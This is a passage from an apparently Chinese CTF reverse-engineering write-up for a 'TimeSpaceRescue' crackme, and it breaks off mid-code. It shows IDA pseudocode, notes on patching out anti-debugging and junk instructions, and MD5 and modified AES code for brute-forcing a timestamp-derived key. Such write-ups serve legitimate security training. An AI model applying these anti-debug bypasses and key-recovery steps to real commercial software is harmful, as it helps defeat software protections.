str) -&gt; str: RRRRyooooooo = &quot;&quot;.join([chr(RRRRRRRyyyyyoooo) for RRRRRRRyyyyyoooo in range(48, 93)]) decoded_str = [] i = 0 while i &lt; len(encoded_str): char1 = encoded_str[i] char2 = encoded_str[i+1] if i+1 &lt; len(encoded_str) else &#x27;&#x27; decoded_str.append(RRRRyooooooo[int(char1) % 45]) decoded_str.append(RRRRyooooooo[int(char2) % 45] if char2 else &#x27;&#x27;) i += 2 return &#x27;&#x27;.join(decoded_str)# 解密整个过程def decrypt_input(input_bytes: bytes) -&gt; str: step1 = reverse_RRRRyyooo(input_bytes.decode()) step2 = reverse_MMMMiiiiiio(step1, 9) return step2# 加密后的数据 ssssssssssssssssssssssssss = bytes([57, 118, 33, 114, 68, 56, 117, 115, 34, 52, 52, 95, 78, 40, 49, 59, 95, 85, 63, 122, 54, 33, 77, 110, 49, 54, 34, 109, 106, 122, 60, 92, 108, 91, 61, 51, 42, 62, 35, 38, 52, 67, 62, 122, 116, 48, 76, 50, 67, 51, 59, 41, 122, 45, 45, 51, 90])# 解密并输出decrypted_output = decrypt_input(sssssssssssss)print(f&quot;解密后的结果: &#123;decrypted_output&#125;&quot;) TimeSpaceRescue拖入ida 12345678910111213141516171819202122232425262728int __cdecl main(int argc, const char **argv, const char **envp)&#123; signed int v4; // [esp+0h] [ebp-11Ch] signed int i; // [esp+4h] [ebp-118h] char Str[256]; // [esp+8h] [ebp-114h] BYREF int Src[4]; // [esp+108h] [ebp-14h] BYREF sub_B220E0(&quot;Before input the key, make sure you&#x27;re on the same spacetime as Liv.\\n&quot;); sub_B220E0(&quot;Try your key:&quot;); memset(Str, 0, sizeof(Str)); sub_B22130(&quot;%s&quot;, Str); memset(Src, 0, sizeof(Src)); initkey(Src); v4 = strlen(Str); aes(Src, 0x10u, Str, v4); for ( i = 0; i &lt; v4; ++i ) &#123; if ( Str[i] != byte_B26104[i] ) &#123; sub_B220E0(&quot;Spacetime turbulence is detected, and rescue fails!\\n&quot;); system(&quot;pause&quot;); exit(0); &#125; &#125; sub_B220E0(&quot;Congratulations on rescuing Liv and successfully protecting the world!\\n&quot;); system(&quot;pause&quot;); return 0;&#125; 先造aes用到的key，然后加密输入，所以先看initkey 1234567891011121314151617181920212223242526272829303132int __cdecl sub_B21DD0(int a1)&#123; __time64_t v1; // rax HANDLE CurrentProcess; // eax int result; // eax int v4; // [esp+0h] [ebp-28h] int j; // [esp+4h] [ebp-24h] int i; // [esp+8h] [ebp-20h] __time64_t Time; // [esp+Ch] [ebp-1Ch] BYREF BOOL pbDebuggerPresent; // [esp+14h] [ebp-14h] BYREF int Src[3]; // [esp+18h] [ebp-10h] BYREF LODWORD(v1) = sub_B22180(0); Time = v1; v4 = sub_B21F80(&amp;Time); memset(Src, 0, sizeof(Src)); pbDebuggerPresent = 0; CurrentProcess = GetCurrentProcess(); CheckRemoteDebuggerPresent(CurrentProcess, &amp;pbDebuggerPresent); if ( !pbDebuggerPresent ) memcpy(Src, (v4 + 12), sizeof(Src)); md5(Src, 0xCu, a1); for ( i = 0; i &lt; 16; ++i ) *(i + a1) ^= 0x14u; result = 11673238; for ( j = 0; j &lt; 16; ++j ) &#123; result = j + a1; *(j + a1) ^= 0x11u; &#125; return result;&#125; 看到time我就有不好的预感，果然是根据时间戳，md5加密生成key，这里有个细节 123456789101112131415161718.text:00B21E8E loc_B21E8E: ; CODE XREF: initkey+96↑j.text:00B21E8E 50 push eax.text:00B21E8F 33 C0 xor eax, eax.text:00B21E91 E8 00 00 00 00 call $+5.text:00B21E91.text:00B21E96 83 C0 05 add eax, 5.text:00B21E99 83 C0 06 add eax, 6.text:00B21E9C 83 C0 07 add eax, 7.text:00B21E9F D1 E0 shl eax, 1.text:00B21EA1 83 F0 02 xor eax, 2.text:00B21EA4 83 C0 01 add eax, 1.text:00B21EA7 83 F8 71 cmp eax, 71h ; &#x27;q&#x27;.text:00B21EAA 74 01 jz short loc_B21EAD.text:00B21EAA.text:00B21EAC retn.text:00B21EAC.text:00B21EAD.text:00B21EAD loc_B21EAD: 本来这个位置是返回，但是看ida汇编代码就会发现，这里有点像花指令，因为再运行的时候会发现这个地方是要跳过的，所以可以nop了，然后就可以看到我的那个伪代码界面了 所以这个函数实现了，md5加密时间戳，然后简单加密生成key（注意，这个时间戳是否赋值是要根据是否处于反调试的）提到这里还有个细节，这个程序肯定要多次调试做，然后就会发现，无论怎么再main中下断点都会退出程序，我直接再start下断点追本溯源发现 12345678910111213141516171819202122232425262728293031 if ( dword_B264DC ) &#123; v1 = 1; &#125; else &#123; dword_B264DC = 1; initterm(&amp;dword_B24110, &amp;dword_B24124); dword_B264DC = 2; &#125; __scrt_release_startup_lock(v10); v2 = sub_B22C41(); v3 = v2; if ( *v2 &amp;&amp; __scrt_is_nonwritable_in_current_image(v2) ) (*v3)(*v3, 0, 2, 0); v4 = sub_B22C47(); v5 = v4; if ( *v4 &amp;&amp; __scrt_is_nonwritable_in_current_image(v4) ) register_thread_local_exe_atexit_callback(*v5); initial_narrow_environment = get_initial_narrow_environment(); v7 = *_p___argv(); v8 = _p___argc(); a1 = main(*v8, v7, initial_narrow_environment); if ( !sub_B22D6A() )LABEL_17: exit(a1); if ( !v1 ) cexit(); __scrt_uninitialize_crt(1, 0); return a1;&#125; 在这里有反调试，也就是那个if判断，每一次都要手动跳过一下，好的接下来看aes了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051int __cdecl aes(void *Src, size_t Size, char *a3, unsigned int a4)&#123; int j; // [esp+10h] [ebp-19Ch] unsigned int i; // [esp+14h] [ebp-198h] char *v7; // [esp+18h] [ebp-194h] unsigned int k; // [esp+1Ch] [ebp-190h] char *v9; // [esp+20h] [ebp-18Ch] char v10[356]; // [esp+24h] [ebp-188h] BYREF int key[4]; // [esp+188h] [ebp-24h] BYREF int v12[4]; // [esp+198h] [ebp-14h] BYREF v7 = a3; v9 = v10; memset(key, 0, sizeof(key)); memset(v12, 0, sizeof(v12)); if ( Size &gt; 0x10 ) return -1; if ( a4 % 0x10 ) return -1; memcpy(key, Src, Size); de2(key); sub_B21490(key, 16, v10); for ( i = 0; i &lt; a4; i += 16 ) &#123; de3(a3); sub_B21750(v12, a3); sub_B21170(v12, v10); for ( j = 1; j &lt; 10; ++j ) &#123; v9 += 16; sub_B21B90(v12); sub_B21990(v12); sub_B217C0(v12); sub_B21170(v12, v9); &#125; sub_B21B90(v12); sub_B21990(v12); sub_B21170(v12, v9 + 16); sub_B21B30(v12, v7); de2(v7); v7 += 16; a3 += 16; v9 = v10; &#125; if ( byte_B26100 ) &#123; for ( k = 0; k &lt; a4; ++k ) a3[k] ^= 0x11u; &#125; return 0;&#125; 经典AES_EBC，但是有小魔改，我标记成了de2和de3，同样的这个函数的末尾也有一个小花，不过观察发现，a3一共加了32字节，所以后面的异或是不影响输入明文的，最后与flag对比，逻辑就清晰了 time—md5—&gt;key—de2—–AES-EBC ^ input—de2——— | 所以要。。。。。爆破时间，根据题目提示，2024的某一天 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#pragma once#ifndef MD5_H#define MD5_Htypedef struct&#123; unsigned int count[2]; unsigned int state[4]; unsigned char buffer[64];&#125;MD5_CTX;#define F(x,y,z) ((x &amp; y) | (~x &amp; z))#define G(x,y,z) ((x &amp; z) | (y &amp; ~z))#define H(x,y,z) (x^y^z)#define I(x,y,z) (y ^ (x | ~z))#define ROTATE_LEFT(x,n) ((x &lt;&lt; n) | (x &gt;&gt; (32-n)))#define FF(a,b,c,d,x,s,ac) \\ &#123; \\ a += F(b,c,d) + x + ac; \\ a = ROTATE_LEFT(a,s); \\ a += b; \\ &#125;#define GG(a,b,c,d,x,s,ac) \\ &#123; \\ a += G(b,c,d) + x + ac; \\ a = ROTATE_LEFT(a,s); \\ a += b; \\ &#125;#define HH(a,b,c,d,x,s,ac) \\ &#123; \\ a += H(b,c,d) + x + ac; \\ a = ROTATE_LEFT(a,s); \\ a += b; \\ &#125;#define II(a,b,c,d,x,s,ac) \\ &#123; \\ a += I(b,c,d) + x + ac; \\ a = ROTATE_LEFT(a,s); \\ a += b; \\ &#125; void MD5Init(MD5_CTX* context);void MD5Update(MD5_CTX* context, unsigned char* input, unsigned int inputlen);void MD5Final(MD5_CTX* context, unsigned char digest[16]);void MD5Transform(unsigned int state[4], unsigned char block[64]);void MD5Encode(unsigned char* output, unsigned int* input, unsigned int len);void MD5Decode(unsigned int* output, unsigned char* input, unsigned int len);#endif 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &quot;md5.h&quot;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include&lt;time.h&gt;#include &lt;memory.h&gt;unsigned char PADDING[] = &#123; 0x80,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 &#125;;void MD5Init(MD5_CTX* context)&#123; context-&gt;count[0] = 0; context-&gt;count[1] = 0; context-&gt;state[0] = 0x67452301; context-&gt;state[1] = 0xEFCDAB89; context-&gt;state[2] = 0x98BADCFE; context-&gt;state[3] = 0x10325476;&#125;void MD5Update(MD5_CTX* context, unsigned char* input, unsigned int inputlen)&#123; unsigned int i = 0, index = 0, partlen = 0; index = (context-&gt;count[0] &gt;&gt; 3) &amp; 0x3F; partlen = 64 - index; context-&gt;count[0] += inputlen &lt;&lt; 3; if (context-&gt;count[0] &lt; (inputlen &lt;&lt; 3)) context-&gt;count[1]++; context-&gt;count[1] += inputlen &gt;&gt; 29; if (inputlen &gt;= partlen) &#123; memcpy(&amp;context-&gt;buffer[index], input, partlen); MD5Transform(context-&gt;state, context-&gt;buffer); for (i = partlen; i + 64 &lt;= inputlen; i += 64) MD5Transform(context-&gt;state, &amp;input[i]); index = 0; &#125; else &#123; i = 0; &#125; memcpy(&amp;context-&gt;buffer[index], &amp;input[i], inputlen - i);&#125;void MD5Final(MD5_CTX* context, unsigned char digest[16])&#123; unsigned int index = 0, padlen = 0; unsigned char bits[8]; index = (context-&gt;count[0] &gt;&gt; 3) &amp; 0x3F; padlen = (index &lt; 56) ? (56 - index) : (120 - index); MD5Encode(bits, context-&gt;count, 8); MD5Update(context, PADDING, padlen); MD5Update(context, bits, 8); MD5Encode(digest, context-&gt;state, 16);&#125;void MD5Encode(unsigned char* output, unsigned int* input, unsigned int len)&#123; unsigned int i = 0, j = 0; while (j &lt; len) &#123; output[j] = input[i] &amp; 0xFF; output[j + 1] = (input[i] &gt;&gt; 8) &amp; 0xFF; output[j + 2] = (input[i] &gt;&gt; 16) &amp; 0xFF; output[j + 3] = (input[i] &gt;&gt; 24) &amp; 0xFF; i++; j += 4; &#125;&#125;void MD5Decode(unsigned int* output, unsigned char* input, unsigned int len)&#123; unsigned int i = 0, j = 0; while (j &lt; len) &#123; output[i] = (input[j]) | (input[j + 1] &lt;&lt; 8) | (input[j + 2] &lt;&lt; 16) | (input[j + 3] &lt;&lt; 24); i++; j += 4; &#125;&#125;void MD5Transform(unsigned int state[4], unsigned char block[64])&#123; unsigned int a = state[0]; unsigned int b = state[1]; unsigned int c = state[2]; unsigned int d = state[3]; unsigned int x[64]; MD5Decode(x, block, 64); FF(a, b, c, d, x[0], 7, 0xd76aa478); /* 1 */ FF(d, a, b, c, x[1], 12, 0xe8c7b756); /* 2 */ FF(c, d, a, b, x[2], 17, 0x242070db); /* 3 */ FF(b, c, d, a, x[3], 22, 0xc1bdceee); /* 4 */ FF(a, b, c, d, x[4], 7, 0xf57c0faf); /* 5 */ FF(d, a, b, c, x[5], 12, 0x4787c62a); /* 6 */ FF(c, d, a, b, x[6], 17, 0xa8304613); /* 7 */ FF(b, c, d, a, x[7], 22, 0xfd469501); /* 8 */ FF(a, b, c, d, x[8], 7, 0x698098d8); /* 9 */ FF(d, a, b, c, x[9], 12, 0x8b44f7af); /* 10 */ FF(c, d, a, b, x[10], 17, 0xffff5bb1); /* 11 */ FF(b, c, d, a, x[11], 22, 0x895cd7be); /* 12 */ FF(a, b, c, d, x[12], 7, 0x6b901122); /* 13 */ FF(d, a, b, c, x[13], 12, 0xfd987193); /* 14 */ FF(c, d, a, b, x[14], 17, 0xa679438e); /* 15 */ FF(b, c, d, a, x[15], 22, 0x49b40821); /* 16 */ /* Round 2 */ GG(a, b, c, d, x[1], 5, 0xf61e2562); /* 17 */ GG(d, a, b, c, x[6], 9, 0xc040b340); /* 18 */ GG(c, d, a, b, x[11], 14, 0x265e5a51); /* 19 */ GG(b, c, d, a, x[0], 20, 0xe9b6c7aa); /* 20 */ GG(a, b, c, d, x[5], 5, 0xd62f105d); /* 21 */ GG(d, a, b, c, x[10], 9, 0x2441453); /* 22 */ GG(c, d, a, b, x[15], 14, 0xd8a1e681); /* 23 */ GG(b, c, d, a, x[4], 20, 0xe7d3fbc8); /* 24 */ GG(a, b, c, d, x[9], 5, 0x21e1cde6); /* 25 */ GG(d, a, b, c, x[14], 9, 0xc33707d6); /* 26 */ GG(c, d, a, b, x[3], 14, 0xf4d50d87); /* 27 */ GG(b, c, d, a, x[8], 20, 0x455a14ed); /* 28 */ GG(a, b, c, d, x[13], 5, 0xa9e3e905); /* 29 */ GG(d, a, b, c, x[2], 9, 0xfcefa3f8); /* 30 */ GG(c, d, a, b, x[7], 14, 0x676f02d9); /* 31 */ GG(b, c, d, a, x[12], 20, 0x8d2a4c8a); /* 32 */ /* Round 3 */ HH(a, b, c, d, x[5], 4, 0xfffa3942); /* 33 */ HH(d, a, b, c, x[8], 11, 0x8771f681); /* 34 */ HH(c, d, a, b, x[11], 16, 0x6d9d6122); /* 35 */ HH(b, c, d, a, x[14], 23, 0xfde5380c); /* 36 */ HH(a, b, c, d, x[1], 4, 0xa4beea44); /* 37 */ HH(d, a, b, c, x[4], 11, 0x4bdecfa9); /* 38 */ HH(c, d, a, b, x[7], 16, 0xf6bb4b60); /* 39 */ HH(b, c, d, a, x[10], 23, 0xbebfbc70); /* 40 */ HH(a, b, c, d, x[13], 4, 0x289b7ec6); /* 41 */ HH(d, a, b, c, x[0], 11, 0xeaa127fa); /* 42 */ HH(c, d, a, b, x[3], 16, 0xd4ef3085); /* 43 */ HH(b, c, d, a, x[6], 23, 0x4881d05); /* 44 */ HH(a, b, c, d, x[9], 4, 0xd9d4d039); /* 45 */ HH(d, a, b, c, x[12], 11, 0xe6db99e5); /* 46 */ HH(c, d, a, b, x[15], 16, 0x1fa27cf8); /* 47 */ HH(b, c, d, a, x[2], 23, 0xc4ac5665); /* 48 */ /* Round 4 */ II(a, b, c, d, x[0], 6, 0xf4292244); /* 49 */ II(d, a, b, c, x[7], 10, 0x432aff97); /* 50 */ II(c, d, a, b, x[14], 15, 0xab9423a7); /* 51 */ II(b, c, d, a, x[5], 21, 0xfc93a039); /* 52 */ II(a, b, c, d, x[12], 6, 0x655b59c3); /* 53 */ II(d, a, b, c, x[3], 10, 0x8f0ccc92); /* 54 */ II(c, d, a, b, x[10], 15, 0xffeff47d); /* 55 */ II(b, c, d, a, x[1], 21, 0x85845dd1); /* 56 */ II(a, b, c, d, x[8], 6, 0x6fa87e4f); /* 57 */ II(d, a, b, c, x[15], 10, 0xfe2ce6e0); /* 58 */ II(c, d, a, b, x[6], 15, 0xa3014314); /* 59 */ II(b, c, d, a, x[13], 21, 0x4e0811a1); /* 60 */ II(a, b, c, d, x[4], 6, 0xf7537e82); /* 61 */ II(d, a, b, c, x[11], 10, 0xbd3af235); /* 62 */ II(c, d, a, b, x[2], 15, 0x2ad7d2bb); /* 63 */ II(b, c, d, a, x[9], 21, 0xeb86d391); /* 64 */ state[0] += a; state[1] += b; state[2] += c; state[3] += d;&#125;unsigned char FA(unsigned char b);unsigned char FB(unsigned char b);unsigned char FC(unsigned char b);unsigned char FD(unsigned char b);unsigned char FE(unsigned char b);unsigned char Ff(unsigned char b);void Cipher(unsigned char* input, unsigned char* output, unsigned char* w);//加密 void InvCipher(unsigned char* input, unsigned char* output, unsigned char* w);//解密 static unsigned char AesSbox[16 * 16] =&#123; 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16&#125;;static unsigned char AesiSbox[16 * 16] =&#123; 0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb, 0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb, 0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e, 0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25, 0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92, 0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84, 0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06, 0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b, 0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73, 0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e, 0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b, 0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4, 0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f, 0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef, 0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d&#125;;static unsigned char AesRcon[11 * 4] =&#123; 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x1b, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00&#125;;unsigned char FA(unsigned char b) &#123; if (b &lt; 0x80) return (b &lt;&lt; 1);else return ((b &lt;&lt; 1) ^ (0x1b)); &#125;unsigned char FB(unsigned char b) &#123; return FA(b) ^ b; &#125;unsigned char FC(unsigned char b) &#123; return FA(FA(FA(b))) ^ b; &#125;unsigned char FD(unsigned char b) &#123; return FA(FA(FA(b))) ^ FA(b) ^ b; &#125;unsigned char FE(unsigned char b) &#123; return FA(FA(FA(b))) ^ FA(FA(b)) ^ b; &#125;unsigned char Ff(unsigned char b) &#123; return FA(FA(FA(b))) ^ FA(FA(b)) ^ FA(b); &#125;void Cipher(unsigned char* input, unsigned char* output, unsigned char* exp_key)&#123; int i, j; int round; unsigned char ttt[4 * 4]; unsigned char State[4][4]; for (i = 0;i &lt; 16;i++) State[i % 4][i / 4] = input[i]; for (j = 0;j &lt; 4;j++)for (i = 0;i &lt; 4;i++)State[i][j] = State[i][j] ^ exp_key[4 * j + i]; for (round = 1; round &lt;= 9; round++) &#123; for (j = 0;j &lt; 4;j++)for (i = 0;i &lt; 4;i++)State[i][j] = AesSbox[State[i][j]]; for (j = 0;j &lt; 4;j++)for (i = 0;i &lt; 4;i++)ttt[4 * i + j] = State[i][j]; for (i = 1;i &lt; 4;i++)for (j = 0;j &lt; 4;j++) &#123; if (i == 1)State[i][j] = ttt[4 * i + (j + 1) % 4];else if (i == 2)State[i][j] = ttt[4 * i + (j + 2) % 4];else if (i == 3)State[i][j] = ttt[4 * i + (j + 3) % 4]; &#125; for (j = 0;j &lt; 4;j++) for (i = 0;i &lt; 4;i++) ttt[4 * i + j] = State[i][j]; for (j = 0;j &lt; 4;j++) &#123; State[0][j] = FA(ttt[0 + j]) ^ FB(ttt[4 * 1 + j]) ^ ttt[4 * 2 + j] ^ ttt[4 * 3 + j]; State[1][j] = ttt[0 + j] ^ FA(ttt[4 * 1 + j]) ^ FB(ttt[4 * 2 + j]) ^ ttt[4 * 3 + j]; State[2][j] = ttt[0 + j] ^ ttt[4 * 1 + j] ^ FA(ttt[4 * 2 + j]) ^ FB(ttt[4 * 3 + j]); State[3][j] = FB(ttt[0 + j]) ^ ttt[4 * 1 + j] ^ ttt[4 * 2 + j] ^ FA(ttt[4 * 3 + j]); &#125; for (j = 0;j &lt; 4;j++)for (i = 0;i &lt; 4;i++)State[i][j] = State[i][j] ^ exp_key[4 * ((round * 4) + j) + i]; &#125; for (j = 0;j &lt; 4;j++)for (i = 0;i &lt; 4;i++)State[i][j] = AesSbox[State[i][j]]; for (j = 0;j &lt; 4;j++)for (i = 0;i &lt; 4;i++)ttt[4 * i + j] = State[i][j]; for (i = 1;i &lt; 4;i++)for (j = 0;j &lt; 4;j++) &#123; if (i == 1)State[i][j] = ttt[4 * i + (j + 1) % 4];else if (i == 2)State[i][j] = ttt[4 * i + (j + 2) % 4];else if (i == 3)State[i][j] = ttt[4 * i + (j + 3) % 4]; &#125; for (j = 0;j &lt; 4;j++)for (i = 0;i &lt; 4;i++)State[i][j] = State[i][j] ^ exp_key[4 * (40 + j) + i]; for (i = 0; i &lt; 16; i++)output[i] = State[i % 4][i / 4];&#125;//Aes解密函数void InvCipher(unsigned char* input, unsigned char* output, unsigned char* exp_key)&#123; int round; int i, j; unsigned char ttt[4 * 4]; unsigned char State[4][4]; for (i = 0; i &lt; 16; i++)State[i % 4][i / 4] = input[i]; for (j = 0;j &lt; 4;j++)for (i = 0;i &lt; 4;i++)State[i][j] = State[i][j] ^ exp_key[4 * (40 + j) + i]; for (round = 9; round &gt;= 1; round--) &#123; for (j = 0;j &lt; 4;j++)for (i = 0;i &lt; 4;i++)ttt[4 * i + j] = State[i][j]; for (i = 1;i &lt; 4;i++)for (j = 0;j &lt; 4;j++) &#123; if (i == 1)State[i][j] = ttt[4 * i + (j + 3) % 4];else if (i == 2)State[i][j] = ttt[4 * i + (j + 2) % 4];else if (i == 3)State[i][j] = ttt[4 * i + (j + 1) % 4]; &#125; for (j = 0;j &lt; 4;j++)for (i = 0;i &lt; 4;i++)State[i][j] = AesiSbox[State[i][j]]; for (j = 0;j &lt; 4;j++)for (i = 0;i &lt; 4;i++)State[i][j] = State[i][j] ^ exp_key[4 * ((round * 4) + j) + i]; for (i = 0; i &lt; 4; i++)for (j = 0; j &lt; 4; j++) ttt[4 * i + j] = State[i][j]; for (j = 0; j &lt; 4; j++) &#123; State[0][j] = Ff(ttt[j]) ^ FD(ttt[4 + j]) ^ FE(ttt[4 * 2 + j]) ^ FC(ttt[4 * 3 + j]); State[1][j] = FC(ttt[j]) ^ Ff(ttt[4 + j]) ^ FD(ttt[4 * 2 + j]) ^ FE(ttt[4 * 3 + j]); State[2][j] = FE(ttt[j]) ^ FC(ttt[4 + j]) ^ Ff(ttt[4 * 2 + j]) ^ FD(ttt[4 * 3 + j]); State[3][j] = FD(ttt[j]) ^ FE(ttt[4 + j]) ^ FC(ttt[4 * 2 + j]) ^ Ff(ttt[4 * 3 + j]); &#125; &#125; for (j = 0;j &lt; 4;j++)for (i = 0;i &lt; 4;i++)ttt[4 * i + j] = State[i][j]; for (i = 1;i &lt; 4;i++)for (j = 0;j &lt; 4;j++) &#123; if (i == 1)State[i][j] = ttt[4 * i + (j + 3) % 4];else if (i == 2)State[i][j] = ttt[4 * i + (j + 2) % 4];else if (i == 3)State[i][j] = ttt[4 * i + (j + 1) % 4]; &#125; for (j = 0;j &lt; 4;j++)for (i = 0;i &lt; 4;i++)State[i][j] = AesiSbox[State[i][j]]; for (j = 0;j &lt; 4;j++)for (i = 0;i &lt; 4;i++)State[i][j] = State[i][j] ^ exp_key[4 * j + i]; for (i = 0; i &lt; 16; i++)output[i] = State[i % 4][i / 4];&#125;/******************************************************函数功能: AES加密, 模式CBC,数据块128位,填充方式:pkcs5padding* 参数:* input_buff:需要加密的数组指针* InputLen:加密数据的字节长度* p_key: 指向密钥数据的指针, 1~16字节长度* output_buff:加密结果输出指针** 返回值: OutLength 加密后的输出长度*********************************************************/unsigned long AES128_CBC_Encrypt(unsigned char* input_buff, unsigned long InputLen, unsigned char* p_key, unsigned char* output_buff, unsigned char* iv)&#123; unsigned long OutLength = 0; long i, j; unsigned char* lpCurInBuff = input_buff; unsigned char* lpCurOutBuff = 